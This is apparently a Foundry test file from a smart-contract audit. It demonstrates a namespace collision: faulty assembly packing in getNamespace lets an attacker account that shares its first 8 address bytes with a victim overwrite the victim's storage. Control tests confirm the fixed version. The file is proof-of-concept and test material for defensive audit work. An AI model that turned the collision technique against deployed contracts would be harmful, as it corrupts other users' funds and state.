// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    NamespacedStorage,
    NamespacedStorageFixed,
    MiniToken
} from "./64110-h-01-incorrect-assembly-packing-in-getnamespace-causes-colli.sol";

contract GetNamespaceCollisionTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // Two DISTINCT accounts sharing their first 8 address bytes (1122334455667788).
    address internal constant VICTIM_A = 0x1122334455667788000000000000000000000001;
    address internal constant ATTACKER_B = 0x1122334455667788000000000000000000000002;

    bytes32 internal constant KEY = bytes32(uint256(1));
    uint256 internal constant VICTIM_SECRET = 1000 ether;
    uint256 internal constant ATTACKER_VALUE = 6660 ether;

    function test_exploit_namespaceCollision_aliasesVictimStorage() public {
        Exploit e = new Exploit();
        e.run();

        // The buggy getNamespace collapses account -> first 8 bytes only, so two
        // distinct accounts sharing those bytes share a namespace.
        assertTrue(e.namespacesCollide(), "namespaces must collide under the bug");
        assertEq(e.nsA(), e.nsB(), "namespace(A) == namespace(B)");
        assertTrue(VICTIM_A != ATTACKER_B, "accounts are distinct");

        // Harm: attacker B's write overwrote victim A's namespaced slot.
        assertEq(e.victimValueBefore(), VICTIM_SECRET, "A stored its secret");
        assertEq(e.victimValueAfter(), ATTACKER_VALUE, "A's slot now returns the attacker's value (alias)");
        assertTrue(e.victimValueAfter() != e.victimValueBefore(), "victim state corrupted");

        // Marker records the corrupted victim magnitude at the SINK.
        assertEq(e.corruptedMagnitude(), VICTIM_SECRET, "corrupted magnitude = victim's original value");
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), VICTIM_SECRET, "marker records corrupted victim state at SINK");
    }

    function test_control_fixedPacking_noCollision_noAlias() public {
        // Same scenario against the FIXED getNamespace (Option 1, shl-based packing).
        NamespacedStorageFixed store_ = new NamespacedStorageFixed();
        address module = address(this);

        // With the fix, distinct accounts produce DISTINCT namespaces.
        assertTrue(
            store_.getNamespace(VICTIM_A, module) != store_.getNamespace(ATTACKER_B, module),
            "fixed: namespaces are distinct"
        );

        // Victim A stores its secret.
        store_.writeStorage(VICTIM_A, KEY, VICTIM_SECRET);
        assertEq(store_.readStorage(VICTIM_A, module, KEY), VICTIM_SECRET, "A secret stored");

        // Attacker B writes its own value.
        store_.writeStorage(ATTACKER_B, KEY, ATTACKER_VALUE);

        // No aliasing: A's value is untouched, B's is its own.
        assertEq(store_.readStorage(VICTIM_A, module, KEY), VICTIM_SECRET, "fixed: A's value preserved");
        assertEq(store_.readStorage(ATTACKER_B, module, KEY), ATTACKER_VALUE, "fixed: B's value isolated");
    }

    function test_control_fixedPacking_crossReadReverts() public {
        // Under the fix, a slot written only for A is NOT readable via B's namespace:
        // the collided cross-read that succeeds under the bug now reverts.
        NamespacedStorageFixed store_ = new NamespacedStorageFixed();
        address module = address(this);

        store_.writeStorage(VICTIM_A, KEY, VICTIM_SECRET);

        vm.expectRevert(NamespacedStorageFixed.SlotNotInitialized.selector);
        store_.readStorage(ATTACKER_B, module, KEY);
    }
}
